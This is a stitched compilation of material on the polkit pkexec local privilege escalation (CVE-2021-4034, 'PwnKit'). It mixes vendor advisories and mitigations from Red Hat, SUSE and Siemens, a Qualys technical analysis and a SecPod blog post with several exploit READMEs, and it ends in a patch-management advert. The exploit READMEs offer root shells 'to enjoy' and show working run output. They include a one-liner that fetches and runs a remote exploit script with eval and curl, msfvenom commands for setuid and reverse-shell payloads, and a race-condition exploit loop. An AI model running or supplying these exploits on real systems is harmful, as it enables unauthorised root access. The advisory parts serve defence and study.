### Insights vulnerability analysis

[View exposed systems](https://console.redhat.com/insights/vulnerability/cves/CVE-2021-4034)

## Executive summary

Red Hat is aware of a vulnerability found in pkexec that allows an authenticated user to perform a privilege escalation attack.

The polkit package is designed to define and handle policies that allow unprivileged processes to communicate with privileged processes on a Linux system. Pkexec, part of polkit, is a tool that allows the user to execute commands as another user according to the polkit policy definitions using the setuid feature. The vulnerability found in pkexec allows an unprivileged [local attacker](https://access.redhat.com/security/glossary#local-attacker) to [escalate privileges](https://access.redhat.com/security/glossary#privilege-escalation), bypassing any authentication and policies due to incorrect handling of the process’s argument vector.

The primary risk for customers is the possibility of an unprivileged user gaining administrative privileges on the affected systems. The attacker must have login access to the target system to carry out the attack.

This issue is assigned [CVE-2021-4034](https://access.redhat.com/security/cve/CVE-2021-4034) rated with a severity impact of [Important](https://access.redhat.com/security/updates/classification).

The following Red Hat product versions are affected. “Affected” means that the vulnerability is present in the product’s code, irrespective of the usage or mitigations, which may address if the product is vulnerable.

* Red Hat Enterprise Linux 6
* Red Hat Enterprise Linux 7
* Red Hat Enterprise Linux 8
* Red Hat Virtualization 4

Further, any Red Hat product supported on Red Hat Enterprise Linux (including RHEL CoreOS) is also potentially impacted. This includes:

* Product containers that are based on the RHEL and ship polkit package. These images are updated regularly, and container health indicating whether a fix to this flaw is available can be seen in the Container Health Index, part of the [Red Hat Container Catalog](https://access.redhat.com/containers).
* Products that pull packages from the RHEL channel (this includes layered products such as Red Hat OpenShift Container Platform, Red Hat OpenStack Platform, Red Hat Virtualization, and others). Ensure that the underlying RHEL polkit package is current in these product environments.

To determine if your system is currently vulnerable to these flaws, see the [Diagnose](http://access.redhat.com/security/vulnerabilities/RHSB-2022-001#diagnose) section below. Additionally, an [Ansible playbook](http://access.redhat.com/security/vulnerabilities/RHSB-2022-001#diagnose) for automatic remediation is provided below.

## Technical summary

The pkexec program does not properly validate the amount of arguments passed to it. This issue eventually leads to attempts to execute environment variables as commands. When properly exploited, this issue leads pkexec to execute arbitrary code as a privileged user, granting the attacker a local privilege escalation. Refer to [CVE-2021-4034](https://access.redhat.com/security/cve/CVE-2021-4034) for more details.

## Mitigation

Red Hat Product Security strongly recommends affected customers update the polkit package once it is available. For customers who cannot update immediately, the issue can be mitigated by executing the following steps:

1. Install the following required systemtap packages and dependencies: <https://access.redhat.com/solutions/5441>.

2. Install polkit debug info:

`debuginfo-install polkit`

3. Create the following systemtap script, and name it pkexec-block.stp:

`probe process("/usr/bin/pkexec").function("main")` `{`

`if (cmdline_arg(1) == "")`

`raise(9);`

`}`

4. Load the systemtap module into the running kernel:

`stap -g -F -m stap_pkexec_block pkexec-block.stp`

5. Ensure the module is loaded:

`lsmod | grep -i stap_pkexec_block`

`stap_pkexec_block 434176 0`

6. Once the polkit package is updated to the version containing the fix, remove the systemtap generated kernel module by running:

`rmmod stap_pkexec_block`

After using the rmmod command, a system reboot isn’t required.

Note: If the system is rebooted, the module generated by the systemtap needs to be reloaded into the kernel. To do that, navigate to the directory where the mitigation script was created and follow steps 4 and 5.

Once the mitigation above is performed, pkexec will continue to work as expected for legitimate use cases.

**Note: This mitigation doesn't work for Secure Boot enabled systems.**SystemTap would require an external compiling server to have the ability to sign the generated kernel module with a key enrolled into the Kernel's keyring.

## Technical details

When starting a new process, the Linux Kernel creates an array with all the command arguments (argv), another array with environment variables (envp), and an integer value representing the argument count (argc). The Linux Kernel positions both the argument array and the environment variables array in a contiguous way in the  memory. Another default behavior is how the first value of the argument array contains the executable name (ex. pkexec for pkexec executable), which implies that any arguments sent to the process by the user are positioned after this value.

![](https://lh3.googleusercontent.com/MKi8Ia_s3xZrX01SInRrg44NUDI6VYW3mfCqRsvlmE0DGxZOKRJXMfmLhX70Wmk7HYhYz2her8yB9QCZVYWiMfDiqm7UZ-NroKRUcwgEuN4XGn2uW65is5G_814FsZYExgZafAIK)

Pkexec does not  validate the argument count, it assumes it will always be at least 1, and that the second value is either NULL, or the command to be executed by pkexec as a privileged user. If an attacker successfully forces the argument array to be empty,  pkexec will interpret content from the environment array as the application to be executed. An attacker can leverage this by manipulating these variables to contain specific values and payloads, allowing it to be executed as a privileged user without any authentication to be requested.

### Service impact

The following Red Hat Services are directly affected:

* OpenShift Dedicated (OSD)
* Azure RedHat OpenShift (ARO)

The impact on Services is Low, since to use polkit, the user should use a graphical or a CLI to authenticate to get a service with polkit acting as the authentication agent. In OSD, the graphical usage is not relevant; in CLI usage, the user will use the OC command to authenticate to the OSD cluster.

Also, OSD does not make any special use of polkit in production clusters. In OSD, on one of the test OSD cluster's master, timedatex has a dependency on polkit. Therefore, for OSD/ARO, the impact is Low.

## Updates for affected products

Red Hat customers running affected versions of these Red Hat products are strongly recommended to update as soon as errata are available.

Customers are urged to apply the available updates immediately and enable the mitigations as they feel appropriate.

## Diagnose

A vulnerability detection script has been developed to determine if your system is currently vulnerable to this flaw. To verify the authenticity of the script, you can download the [detached OpenPGP signature](https://access.redhat.com/sites/default/files/cve-2021-4034--2022-01-25-0936.sh.asc) as well. Instructions on [how to use GPG signatures for verification](https://access.redhat.com/articles/5433831) are available on the Customer Portal.

### Determine if your system is vulnerable

Current version: 1.0

[Download Detection Script](https://access.redhat.com/sites/default/files/cve-2021-4034--2022-01-25-0936.sh)

## Ansible Playbook

Additionally, an Ansible playbook is available which automates the mitigation described above. This playbook will install the packages necessary to use systemtap, and will then create and install a systemtap script to prevent the use of the pkexec command without arguments. This mitigation will need to be re-applied after a reboot, which can be achieved by re-running the playbook.

To use the playbook, define the extra variable HOSTS with the Ansible inventory name of the hosts to which the mitigation will be applied. For example,

ansible-playbook -e HOSTS=web,ns1,mail CVE-2021-4034\_stap\_mitigate.yml

To verify the authenticity of the playbook, you can download the [detached OpenPGP signature](https://access.redhat.com/sites/default/files/cve-2021-4034_stap_mitigate--2022-01-28-1236.yml.asc). Instructions on [how to use GPG signature for verification](https://access.redhat.com/articles/5433831) are available on the Customer Portal.

### Automate the mitigation

Current version: 1.1

## FAQ

Q: After applying the fix, is there a need to restart any service or system to ensure the system is not vulnerable?

A: There’s no need to restart any service or reboot the system. The fix is applied on pkexec, which is a tool from the polkit suite. It’s a single instance run, and once the update is applied, the next time pkexec is executed, it should load the patched application. When the update is applied, the update process restarts the polkit service.

Q: Is there a need to restart the system or service after applying the recommended mitigation ?

A: There’s no need to restart the system after applying the mitigation. Systemtap itself will make sure the kernel module is loaded.

Q: Is it safe to remove the setuid permission from pkexec binary as a mitigation?

A: Red Hat does not recommend removing the setuid bit as it will cause breakage on the system. Removing the setuid permission from the pkexec binary will prevent it from working properly for legitimate use cases. This means that any application which relies on pkexec execution will stop working, possibly causing unexpected system errors and behavior. While the Qualys advisory on this vulnerability listed removing setuid as potential mitigation, this is determined to not be a viable mitigation for our customers without causing breakage. Red Hat provided an alternative mitigation which, when applied, does not have a negative impact to the functionality of pkexec. Any mitigation used should be only on a short-term basis until released patches can be applied.

Q: What is the impact on the OpenShift Container Platform?

A: In OpenShift Container Platform (OCP), the polkit package is shipped in the [RHCOS](https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fdocs.openshift.com%2Fcontainer-platform%2Flatest%2Farchitecture%2Farchitecture-rhcos.html), which is used in cluster nodes. Access to the OCP nodes is restricted to the cluster administrators only. If someone can connect directly to the OCP node, and will be a root user already, then the existence of the vulnerable polkit package doesn't change anything.

The polkit package is also shipped in several OCP container images used by cluster administrators to manage the OCP cluster. These images are run as privileged containers, so anyone who can gain access to these containers already has full admin access.

Q: I’m running Red Hat Enterprise Linux 7.x with Docker. After the restart, my containers are not accessible through the network anymore. What should I do?

A: When Docker starts, it sets net.ipv4.ip\_forward to 1, allowing IP forwarding, which is needed to make containers accessible through the network. However, it is not persisted in the machine configuration. When updating the polkit package, the polkit service will automatically restart on the Red Hat Enterprise Linux server and ends triggering the system to reload the kernel configuration. This overrides non persisted sysctl entries, causing the Docker containers to be inaccessible through the network. To avoid such behavior, the system admin needs to make sure the net.ipv4.ip\_forward desired value is persisted into sysctl configuration files. See [How to set sysctl variables on Red Hat Enterprise Linux](https://access.redhat.com/solutions/2587) for more information regarding this procedure.

# CVE-2021-4034

One day for the polkit privilege escalation exploit

Just execute `make`, `./cve-2021-4034` and enjoy your root shell.

The original advisory by the real authors is [here](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)

## PoC

If the exploit is working you'll get a root shell immediately:

```
vagrant@ubuntu-impish:~/CVE-2021-4034$ make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp /usr/bin/true GCONV_PATH=./pwnkit.so:.
vagrant@ubuntu-impish:~/CVE-2021-4034$ ./cve-2021-4034
# whoami
root
# exit
```

Updating polkit on most systems will patch the exploit, therefore you'll get the usage and the program will exit:

```
vagrant@ubuntu-impish:~/CVE-2021-4034$ ./cve-2021-4034
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
vagrant@ubuntu-impish:~/CVE-2021-4034$
```

## Dry Run

To not execute a shell but just test if the system is vulnerable compile the `dry-run` target.

If the program exit printing "root" it means that your system is vulnerable to the exploit.

```
vagrant@ubuntu-impish:~/CVE-2021-4034$ make dry-run
...
vagrant@ubuntu-impish:~/CVE-2021-4034$ dry-run/dry-run-cve-2021-4034
root
vagrant@ubuntu-impish:~/CVE-2021-4034$ echo $?
1
```

If your system is not vulnerable it prints an error and exit.

```
vagrant@ubuntu-impish:~/CVE-2021-4034$ dry-run/dry-run-cve-2021-4034
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
vagrant@ubuntu-impish:~/CVE-2021-4034$ echo $?
0
```

## About Polkit pkexec for Linux

Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes. It is also possible to use polkit to execute commands with elevated privileges using the command pkexec followed by the command intended to be executed (with root permission).

# One-liner commands

You can easily exploit the system using a single script, downloadable and executable with this command:

```
eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
```

```
vagrant@ubuntu-impish:~/CVE-2021-4034$ whoami
vagrant
vagrant@ubuntu-impish:~/CVE-2021-4034$ eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
# whoami
root
```

# Mitigation

If no patches are available for your operating system, you can remove the SUID-bit from pkexec as a temporary mitigation.

```
# chmod 0755 /usr/bin/pkexec
```

The exploit then will fail complaining that `pkexec` must have the
setuid bit enabled.

```
vagrant@ubuntu-impish:/vagrant/CVE-2021-4034$ sudo chmod 0755 /usr/bin/pkexec
vagrant@ubuntu-impish:/vagrant/CVE-2021-4034$ ./cve-2021-4034
GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
pkexec must be setuid root
```

# CVE-2021-4034

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2021-4032.html) [[Index]](index.html) [[Next]](CVE-2021-4037.html)

### Upstream information

[CVE-2021-4034 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034)

#### Description

A local privilege escalation vulnerability was found on polkit's pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.

| [Description](show_bug.cgi?id=2025869#c0)  msiddiqu    2021-11-23 09:16:03 UTC  ``` A Local Privilege Escalation vulnerability (from any user to root) was found in polkit's pkexec, a SUID-root program that is installed by default on every major Linux distribution.   ```  [Comment 5](show_bug.cgi?id=2025869#c5)  lnacshon    2021-11-24 09:15:56 UTC  ``` OSD clusters are affected with low severity, just because some clusters are making use of packages which have dependencies on polkit (e.g. timedatex). Also as affecting by OCP, polkit package was shipped in OCP 4.7 only.   ```  [Comment 11](show_bug.cgi?id=2025869#c11)  Marco Benatto    2022-01-20 15:58:48 UTC  ``` There's an issue on pkexec where it doesn’t validate the argument count, assuming it will always be at least 1 and that the second value is either NULL or the command to be executed by pkexec as a privileged user. If an attacker successfully forces the argument array to be empty, this means pkexec will interpret content from the environment array as the application to be executed. An attacker can leverage this by manipulating these variables to contain specific values and payloads, allowing it to be executed as a privileged user without any authentication to be requested.   ```  [Comment 12](show_bug.cgi?id=2025869#c12)  Marco Benatto    2022-01-25 17:23:21 UTC  ``` Created polkit tracking bugs for this issue:  Affects: fedora-all [[bug 2045563](show_bug.cgi?id=2045563 "CLOSED ERRATA -

In OSD, the graphical usage is not relevant; in CLI usage, the user will use the OC command to authenticate to the OSD cluster. Also, OSD does not make any special use of polkit in production clusters. In OSD, on one of the test OSD cluster's master, timedatex has a dependency on polkit. Therefore, for OSD/ARO, the impact is Low.   Your OSD clusters are in the production group and therefore do not make any special use of polkit.   If you have any additional questions, please let me know.   ``` |  |

# PwnKit Linux vulnerability Jan-2022: Local Privilege Escalation Vulnerability In Major Linux Distributions

* Post author:[Mohamed Faiz](https://www.secpod.com/blog/author/mohamed/ "Posts by Mohamed Faiz")
* Post published:January 28, 2022
* Reading time:9 mins read

Most of the Linux distributions have the **pkexec binary**. The vulnerability **([CVE-2021-4034](https://www.scaprepo.com/view.jsp?id=CVE-2021-4034))** lies in that binary. The pkexec is a part PwnKit Linux vulnerability Jan-2022, which affects the Polkit open-source application framework used for interaction between privileged and unprivileged processes. Furthermore, the affected binary can also allow executing commands with elevated privileges. A [patch management software](https://www.secpod.com/patch-management/) can help deploy the patches more efficiently.

The vulnerability has existed for about 12 years since the release of version 0.113 of the pkexec component. Almost all of the popular Linux distros are affected, including RHEL, Fedora, Debian, CentOS, and many unknown Linux distros, along with the uneven versions of those distros. Moreover, having a fast scanning [vulnerability management tool](https://www.secpod.com/vulnerability-management/) can be a benefit most of the times.

---

### **Vulnerability Details of PwnKit Linux vulnerability Jan-2022**

The pkexec command in Polkit has a **memory corruption vulnerability** that leads to local privilege escalation. This vulnerability allows a regular user to elevate to root. A remote**attack is not possible** with this particular flaw. Any person having access to a non-privileged user in a system can exploit this vulnerability to **gain the privileges of a root user**.

Could you look at the PwnKit Linux vulnerability Jan-2022 code snippet from the pkexec binary?

> ———————————————————————–
>
> 534        for (n = 1; n < (guint) argc; n++) { ….. }
>
> 610        path = g\_strdup (argv[n]);
>
> 629        if (path[0] != ‘/’) {
>
> 632        s = g\_find\_program\_in\_path (path);
>
> 639        argv[n] = path = s;
>
> 640        }
>
> ————————————————————————

* The binary pkexec expects an argument (A command will be passed as an argument). If pkexec command is executed without an argument, in the main program, at line 534, argc value will be 0.
* But the ‘for loop’ is initiated with **n=1**.
* So the argv[n] in line 610, will read out-of-bounds value from argv[1].
* The out-of-bounds argv[1] points to the first environment variable, “value.”
* The obtained path, “value” is passed to a function g\_find\_program\_in\_path(path) in line 632, because “value” is not starting with ‘/’ (as per the condition in line 629).
* The g\_find\_program\_in\_path function searches the binary “value” path in the PATH environment variables. As a result, the ‘s’ variable will have the full path of the executable binary, if and only if the binary exists, and at last, the full path of the “value” binary is written out-of-bounds to argv[n] (i.e., argv[1]).

Moreover, the above part of the snippet allows the attacker to **craft malicious environment variables** and run it as a command using pkexec to **attain the privilege escalation** which will remove the PwnKit [Linux vulnerability](https://www.secpod.com/vulnerability-management/) Jan-2022

### **Exploit Snippet**

SecPod Security Research Team exploited this vulnerability to gain further technical details.

> $ ls -l /usr/bin/pkexec
>
> -rwsr-xr-x 1 root root 23376 Mar 27 2019 /usr/bin/pkexec

* Give front on what is suid.

> $ id
>
> uid=1001(secpod) gid=1001(secpod) groups=1001(secpod),4(adm),27(sudo),113(lpadmin),128(sambashare)

* Logged in with a user with less privileges named “secpod” having uid “1001.”

> $ ./cve-2021-4034
>
> # id
>
> uid=0(root) gid=0(root) groups=0(root),4(adm),27(sudo),113(lpadmin),128(sambashare),1001(secpod)
>
> # whoami
>
> root

* As soon as secpod user performs the exploit, we get access to the root shell.

**Mitigation**

You can use SanerNow to detect and [mitigate this vulnerability](https://www.secpod.com/patch-management/). (PwnKit Linux vulnerability Jan-2022)

All major vendors have published fixes for their respective OS. In addition, **Ubuntu** has provided an update for PolicyKit to address the vulnerability in versions 14.04 and 16.04 ESM (extended security maintenance) and more recent versions of ubuntu, such as 18.04 20.04, and 21.04.

**Red Hat** also released a security update for PolicyKit on Workstation and Enterprise products and extended life cycle support, AUS, and TUS.

**SUSE** and **Debian** also have released fixes for this vulnerability for most of their supported versions.

---

#### **Other Workarounds and Mitigation**

For systems that cannot use SanerNow or if the security update of the specific vendor has not published a fix, you can use the following walkaround to mitigate this vulnerability temporarily.

> # chmod u-s /usr/bin/pkexec

The above command will remove SUID-bit from pkexec command.

Python3 code to exploit
[CVE-2021-4034](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
[(PWNKIT)](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt).
This was an exercise in "can I make this work in Python?", and not meant
as a robust exploit. It Works For Me, there are problaby bugs.

The default payload starts a shell as `root`, generated from `msfvenom`:

```
msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64

```

I've tested `linux/x64/shell_reverse_tcp` as well. Make sure you include
the `PrependSetuid=true` argument to `msfvenom`, otherwise you'll just get
a shell as the user and not root.

The code is cribbed from [blasty](https://twitter.com/bl4sty), the orginal is
available [here](https://haxx.in/files/blasty-vs-pkexec.c)

pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)
========================================================================
Contents

Exploitation
Acknowledgments
Timeline
========================================================================
Summary
========================================================================
We discovered a Local Privilege Escalation (from any user to root) in
polkit's pkexec, a SUID-root program that is installed by default on
every major Linux distribution:
"Polkit (formerly PolicyKit) is a component for controlling system-wide
privileges in Unix-like operating systems. It provides an organized way
for non-privileged processes to communicate with privileged ones. [...]
It is also possible to use polkit to execute commands with elevated
privileges using the command pkexec followed by the command intended to
be executed (with root permission)." (Wikipedia)
This vulnerability is an attacker's dream come true:
- pkexec is installed by default on all major Linux distributions (we
exploited Ubuntu, Debian, Fedora, CentOS, and other distributions are
probably also exploitable);
- pkexec is vulnerable since its creation, in May 2009 (commit c8c3d83,
"Add a pkexec(1) command");
- any unprivileged local user can exploit this vulnerability to obtain
full root privileges;
- although this vulnerability is technically a memory corruption, it is
exploitable instantly, reliably, in an architecture-independent way;
- and it is exploitable even if the polkit daemon itself is not running.
We will not publish our exploit immediately; however, please note that
this vulnerability is trivially exploitable, and other researchers might
publish their exploits shortly after the patches are available. If no
patches are available for your operating system, you can remove the
SUID-bit from pkexec as a temporary mitigation; for example:
# chmod 0755 /usr/bin/pkexec
This vulnerability is one of our most beautiful discoveries; to honor
its memory, we recommend listening to DJ Pone's "Falken's Maze" (double
pun intended) while reading this advisory. Thank you very much!
========================================================================
Analysis
========================================================================
pkexec is a sudo-like, SUID-root program, described as follows by its
man page:
------------------------------------------------------------------------
NAME
pkexec - Execute a command as another user
SYNOPSIS
pkexec [--version] [--disable-internal-agent] [--help]
pkexec [--user username] PROGRAM [ARGUMENTS...]
DESCRIPTION
pkexec allows an authorized user to execute PROGRAM as another
user. If PROGRAM is not specified, the default shell will be run.
If username is not specified, then the program will be executed
as the administrative super user, root.
------------------------------------------------------------------------
The beginning of pkexec's main() function processes the command-line
arguments (lines 534-568), and searches for the program to be executed
(if its path is not absolute) in the directories of the PATH environment
variable (lines 610-640):
------------------------------------------------------------------------
435 main (int argc, char \*argv[])
436 {
...
534 for (n = 1; n < (guint) argc; n++)
535 {
...
568 }
...
610 path = g\_strdup (argv[n]);
...
629 if (path[0] != '/')
630 {
...
632 s = g\_find\_program\_in\_path (path);
...
639 argv[n] = path = s;
640 }
------------------------------------------------------------------------
Unfortunately, if the number of command-line arguments argc is 0 (if the
argument list argv that we pass to execve() is empty, i.e. {NULL}), then
argv[0] is NULL (the argument list's terminator) and:
- at line 534, the integer n is permanently set to 1;
- at line 610, the pointer path is read out-of-bounds from argv[1];
- at line 639, the pointer s is written out-of-bounds to argv[1].
But what exactly is read from and written to this out-of-bounds argv[1]?
To answer this question, we must digress briefly. When we execve() a new
program, the kernel copies our argument and environment strings and
pointers (argv and envp) to the end of the new program's stack; for
example:
|---------+---------+-----+------------|---------+---------+-----+------------|
| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] |
|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------|
V V V V V V
"program" "-option" NULL "value" "PATH=name" NULL
Clearly (because the argv and envp pointers are contiguous in memory),
if argc is 0, then the out-of-bounds argv[1] is actually envp[0], the
pointer to our first environment variable, "value". Consequently:
- at line 610, the path of the program to be executed is read
out-of-bounds from argv[1] (i.e. envp[0]), and points to "value";
- at line 632, this path "value" is passed to g\_find\_program\_in\_path()
(because "value" does not start with a slash, at line 629);
- g\_find\_program\_in\_path() searches for an executable file named "value"
in the directories of our PATH environment variable;
- if such an executable file is found, its full path is returned to
pkexec's main() function (at line 632);
- and at line 639, this full path is written out-of-bounds to argv[1]
(i.e. envp[0]), thus overwriting our first environment variable.
More precisely:
- if our PATH environment variable is "PATH=name", and if the directory
"name" exists (in the current working directory) and contains an
executable file named "value", then a pointer to the string
"name/value" is written out-of-bounds to envp[0];
- or, if our PATH is "PATH=name=.", and if the directory "name=." exists
and contains an executable file named "value", then a pointer to the
string "name=./value" is written out-of-bounds to envp[0].
In other words, this out-of-bounds write allows us to re-introduce an
"unsecure" environment variable (for example, LD\_PRELOAD) into pkexec's
environment; these "unsecure" variables are normally removed (by ld.so)
from the environment of SUID programs before the main() function is
called. We will exploit this powerful primitive in the following
section.
Last-minute note: polkit also supports non-Linux operating systems such
as Solaris and \*BSD, but we have not investigated their exploitability;
however, we note that OpenBSD is not exploitable, because its kernel
refuses to execve() a program if argc is 0.
========================================================================
Exploitation
========================================================================
Our question is: to successfully exploit this vulnerability, which
"unsecure" variable should we re-introduce into pkexec's environment?
Our options are limited, because shortly after the out-of-bounds write
(at line 639), pkexec completely clears its environment (at line 702):
------------------------------------------------------------------------
639 argv[n] = path = s;
...
657 for (n = 0; environment\_variables\_to\_save[n] != NULL; n++)
658 {
659 const gchar \*key = environment\_variables\_to\_save[n];
...
662 value = g\_getenv (key);
...
670 if (!validate\_environment\_variable (key, value))
...
675 }
...
702 if (clearenv () != 0)
------------------------------------------------------------------------
The answer to our question comes from pkexec's complexity: to print an
error message to stderr, pkexec calls the GLib's function g\_printerr()
(note: the GLib is a GNOME library, not the GNU C Library, aka glibc);
for example, the functions validate\_environment\_variable() and
log\_message() call g\_printerr() (at lines 126 and 408-409):
------------------------------------------------------------------------
88 log\_message (gint level,
89 gboolean print\_to\_stderr,
90 const gchar \*format,
91 ...)
92 {
...
125 if (print\_to\_stderr)
126 g\_printerr ("%s\n", s);
------------------------------------------------------------------------
383 validate\_environment\_variable (const gchar \*key,
384 const gchar \*value)
385 {
...
406 log\_message (LOG\_CRIT, TRUE,
407 "The value for the SHELL variable was not found the /etc/shells file");
408 g\_printerr ("\n"
409 "This incident has been reported.\n");
------------------------------------------------------------------------
g\_printerr() normally prints UTF-8 error messages, but it can print
messages in another charset if the environment variable CHARSET is not
UTF-8 (note: CHARSET is not security sensitive, it is not an "unsecure"
environment variable). To convert messages from UTF-8 to another
charset, g\_printerr() calls the glibc's function iconv\_open().
To convert messages from one charset to another, iconv\_open() executes
small shared libraries; normally, these triplets ("from" charset, "to"
charset, and library name) are read from a default configuration file,
/usr/lib/gconv/gconv-modules. Alternatively, the environment variable
GCONV\_PATH can force iconv\_open() to read another configuration file;
naturally, GCONV\_PATH is one of the "unsecure" environment variables
(because it leads to the execution of arbitrary libraries), and is
therefore removed by ld.so from the environment of SUID programs.
Unfortunately, CVE-2021-4034 allows us to re-introduce GCONV\_PATH into
pkexec's environment, and to execute our own shared library, as root.
Important: this exploitation technique leaves traces in the logs (either
"The value for the SHELL variable was not found the /etc/shells file" or
"The value for environment variable [...] contains suscipious content").
However, please note that this vulnerability is also exploitable without
leaving any traces in the logs, but this is left as an exercise for the
interested reader.

WORKAROUNDS AND MITIGATIONS

Siemens has identiﬁed the following speciﬁc workarounds and mitigations that customers can apply to
reduce the risk:

• Restrict system access to authorized personnel and follow a least privilege approach

• Temporary mitigation exists at the expense of pkexec’s capabilities. By removing SUID permissions,
the program cannot run processes as root. However, any processes that rely on it for normal
operation will be affected

- SUID permission can be removed with chmod, as follows: chmod 0755 /usr/bin/pkexec

Product speciﬁc remediations or mitigations can be found in the section Affected Products and Solution.

Please follow the General Security Recommendations.

GENERAL SECURITY RECOMMENDATIONS

As a general security measure, Siemens strongly recommends to protect network access to devices
with appropriate mechanisms. In order to operate the devices in a protected IT environment, Siemens
recommends to conﬁgure the environment according to Siemens’ operational guidelines for Industrial
Security (Download: https://www.siemens.com/cert/operational-guidelines-industrial-security), and to
follow the recommendations in the product manuals.

PRODUCT DESCRIPTION

A combination of hardware and software, Siemens’ SINUMERIK Edge provides a machine-oriented
platform for apps that facilitate digital production support and optimization.

SCALANCE LPE9000 (Local Processing Engine) extends the SCALANCE family portfolio by a component
that provides computing power for a wide range of applications in the network, close to the process –
Edge Computing.

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.1
(CVSS v3.1) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

An additional classiﬁcation has been performed using the CWE classiﬁcation, a community-developed list
of common software security weaknesses. This serves as a common language and as a baseline for
weakness identiﬁcation, mitigation, and prevention efforts. A detailed list of CWE classes can be found at:
https://cwe.mitre.org/.

Vulnerability CVE-2021-4034

A local privilege escalation vulnerability was found on polkit’s pkexec utility. The pkexec application is
a setuid tool designed to allow unprivileged users to run commands as privileged users according
predeﬁned policies. The current version of pkexec doesn’t handle the calling parameters count
correctly and ends trying to execute environment variables as commands. An attacker can leverage
this by crafting environment variables in such a way it’ll induce pkexec to execute arbitrary code.
When successfully executed the attack can cause a local privilege escalation given unprivileged users
administrative rights on the target machine.

# CVE-2021-4034

Exploit for the [pwnkit vulnerability](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)
from the Qualys team.

This exploit assumes that `gcc` is present on the target machine.

```
$ id
uid=1001(ayrx) gid=1002(ayrx) groups=1002(ayrx),27(sudo)
$ ./setup.sh

```

Run the following command in one bash session:

```
while :; do mv "GCONV_PATH=./value" "GCONV_PATH=./value.bak"; mv "GCONV_PATH=./value.bak" "GCONV_PATH=./value"; done

```

Run the following command in another bash session:

```
while :; do ./exploit; done

```

You will eventually win the race and obtain a `shell` binary that gives you
root access:

```
$ ls -lah shell
-rwsrwxrwx 1 root ayrx 16K Jan 26 08:57 shell
$ ./shell
# id
uid=0(root) gid=1002(ayrx) groups=1002(ayrx),27(sudo)

```

A short write up on the technique can be found on my [blog](https://www.ayrx.me/pwnkit-no-logs/).

# Security vulnerability: CVE-2021-4034 local root exploit in polkit aka "pwnkit"

This document **(000020564)** is provided subject to the [disclaimer](#disclaimer) at the end of this document.

### Environment

For a comprehensive list of affected products and package versions, please see the SUSE CVE announcement:
<https://www.suse.com/security/cve/CVE-2021-4034.html>

### Situation

Qualys security researchers have identified a local root exploit in "pkexec" component of polkit. Local attackers can use the setuid root /usr/bin/pkexec binary to reliably escalate privileges to root.

This vulnerability affects all SLES 12 and SLES 15 service packs.
The vulnerability does not affect SLES 11, as it used a previous generation called PolicyKit.
### Resolution

Installing the updated packages provided by SUSE is sufficient to fix the problem. Please use

zypper lp -a --cve=CVE-2021-4034

to search for the specific patch information. A restart of the service is not required.

Please note that for any SPx (Service Pack level) which is no longer in general support, an LTSS or ESPOS subscription may be needed to obtain the update.  Please see the SUSE "CVE Page" link in the "Additional Information" section below for more details about each SPx.

SUSE does not recommend removing the setuid bit as it will cause breakage on the system. Removing the setuid permission from the pkexec binary will prevent it from working properly for legitimate use cases.  This means that any application which relies on pkexec execution will stop working, possibly causing unexpected system errors and behavior.
The workaround prevents exploitation and might be the right thing to do given how easy the exploit it, but customers must be aware that this will break functionality until the update is installed.

### Status

Security Alert
### Additional Information

**Workaround**

It is also possible to remove the setuid bit from /usr/bin/pkexec with

    chmod 755 /usr/bin/pkexec

or even delete /usr/bin/pkexec until fixed packages can be installed.

### Take Patch Management Miles Ahead with the Industry Leading Patching Capabilities

 Automate Patching for Faster Deployment

Manual patching cycles are tedious and time-consuming. With the SanerNow automated patch management tool, configure end-to-end workflows for automatic patching and fix risks faster than ever. Schedule automated patching tasks and make patching a hands-free task. It also supports the upload of pre and post-remediation scripts.

 Test and Approve Patches for Zero-Disruption

Applying new patches directly to the production environment is risky. SanerNow patch management software enables you to create a test environment to test the new patches to verify compatibility. Later, deploy the approved patches across the devices in your production environment and prevent any disruptions and productivity errors.

 Perimeter-Less Patching with a Single, light-weight Agent

